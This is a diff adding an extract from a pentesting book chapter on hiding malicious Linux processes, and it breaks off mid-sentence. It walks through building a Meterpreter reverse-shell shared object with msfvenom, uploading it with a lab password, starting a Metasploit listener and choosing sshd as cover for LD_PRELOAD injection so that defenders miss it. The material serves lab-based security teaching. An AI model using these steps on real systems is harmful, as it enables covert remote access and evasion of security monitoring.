@@ -1,0 +1,51 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 12 - Concealing Malicious Processes
+Defensive tools frequently identify malicious activity based on the presence of anomalous processes running on a system. In this section, we’ll consider three techniques for keeping a malicious process out of sight: preloading malicious shared libraries into a benign process, hiding the process’s execution, and changing the process name to masquerade as legitimate.
+Security Relevance Score: 7
+Word Count: 463
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Concealing Malicious Processes
+Defensive tools frequently identify malicious activity based on the presence of anomalous processes running on a system. In this section, we’ll consider three techniques for keeping a malicious process out of sight: preloading malicious shared libraries into a benign process, hiding the process’s execution, and changing the process name to masquerade as legitimate.
+
+Library Preloading
+Let’s use LD_PRELOAD to preload a malicious shared library. This environment variable accepts a list of user-specified shared objects to load before all others. We’ll set up a listener on Kali and perform the shared library preloading on a process on p-jumpbox-01 (172.16.10.13).
+As our malicious code, we’ll use Metasploit’s Meterpreter payload, a part of the Metasploit framework, which can provide attackers with an interactive shell. On Kali, run the following command to generate a Meterpreter shared object:
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.10.1 LPORT=2222 -f
+elf-so > meterpreter.so
+
+This command uses the reverse_tcp payload, which will bind on the local host address of 172.16.10.1 (Kali’s address), on local port 2222/TCP, using the elf-so format. Then it will redirect output into meterpreter.so. Run the file command to see the format of this file:
+$ file meterpreter.so
+
+meterpreter.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
+dynamically linked, stripped
+
+You can then upload this file to the p-jumpbox-01 machine with scp:
+$ scp -O meterpreter.so backup@172.16.10.13:/tmp
+This command uses the backup user. Remember that their password is backup.
+
+NOTE
+
+Be aware that any endpoint security protection controls running on the system may notify security analysts of the existence of a Meterpreter payload. In general, writing your own payload is often a more effective way of ensuring that an operation will go undetected.
+Next, on Kali, run msfconsole to start Metasploit, then set up the TCP listener:
+msf > use exploit/multi/handler
+msf > set payload linux/x64/meterpreter/reverse_tcp
+msf > set LHOST 172.16.10.1
+msf > set LPORT 2222
+msf > run
+
+This listener will establish a Meterpreter session after we preload the Meterpreter shared object.
+We want to load the Meterpreter payload into an innocent-looking process. Let’s see what processes are currently running on p-jumpbox-01 (172.16.10.13):
+$ ps aux
+
+USER    PID %CPU %MEM   STAT START   TIME COMMAND
+root      1  0.0  0.0   Ss   Nov23   0:00 /bin/sh -c service ssh restart && tail -f /dev/null
+root     17  0.0  0.0   Ss   Nov23   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+root     28  0.0  0.0   S    Nov23   0:38 tail -f /dev/null
+root  30238  0.0  0.0   Ss   Nov28   0:00 bash
+root  37405  100  0.0   R+   03:14   0:00 ps aux
+
+If your malicious operation will establish a network connection, it’s recommended to use a process that blue teamers expect to see performing network activity, such as an SSH server or a web server. In this case, we’ll use sshd with the command in Listing 12-
